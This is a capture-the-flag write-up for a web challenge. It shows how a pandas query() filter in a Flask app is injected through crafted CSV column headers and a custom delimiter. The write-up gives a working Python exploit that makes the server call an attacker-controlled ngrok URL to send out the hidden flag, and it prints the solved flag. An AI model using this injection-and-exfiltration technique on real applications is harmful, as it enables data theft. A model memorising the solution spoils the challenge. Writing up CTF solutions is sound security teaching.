# Rnd For Data Science &mdash; Solution

## Source code analysis

We have two files:

* app.py
* generator_app.py

First, the Flask application is exposed, and the generator app is used to generate the random matrix.
The generator app pushes the flag into the generated matrix, but then the frontend `app.py` will filter out
the `FLAG`.

Filtering is done with the following code in `app.py`:

```python3
# Filter out secrets
first = list(df.columns.values)[1]
df = df.query(f'{first} != "FLAG"')

```
## Attack

Pandas `query` here is vulnerable to injection. The application is a header to compare
with the `"FLAG"` string.

We can inject some code and somehow expose the flag.

Code inside the `query` will use local objects, so it is possible to use the `requests` module inside
the query. We will try to send the flag to our server.

The problem is that if we want to use objects, we will need to use the `@` operator, but this operator
is forbidden: `'\'"!@'`.

We can escape this by using a delimiter called '@'. Delimiter is not forbbiden.
Another fact is that we have a bug here: `df = pd.read_csv(csv)`, where we use `,` delimiter as default.

We will construct our header so that the first header will be `test,` and `,` is here because
injection will be in the second header. We will use the input delimiter as a concatenation char, so for the CSV reading, we will have only two headers, and for the backend, we will have multiple headers separated by the `@`.

Additionally, we can add a custom URL `GET` parameter with the name `delimiter` because we can reuse the `delimiter_const` variable to fetch this `GET` parameter.

So, we will construct the following request:

```
https://tbtl-rnd-for-data-science.chals.io/generate?delimiter=https://e7f0-85-94-74-102.ngrok-free.app?param=
```

And with a `POST` request parameters, we will inject the following command:

```
@requests.get(@request.args.get(@delimiter_const)+@df.tail(1).to_string(header=False))#
```

Here is a request for the attack:

```python3
import requests

data = {'numColumns': '5',
        'columnName0': 'test,',
        'columnName1': 'requests.get(',
        'columnName2': 'request.args.get(',
        'columnName3': 'delimiter_const)+',
        'columnName4': 'df.tail(1).to_string(header=False))#',
        'delimiter': '@'
        }


r = requests.post("https://tbtl-rnd-for-data-science.chals.io/generate?delimiter=https://e7f0-85-94-74-102.ngrok-free.app?param=", data=data)

print(r.text)
```

We got the flag: `TBTL{d4T4_5c13nc3_15_n07_f0r_r0ck135}`
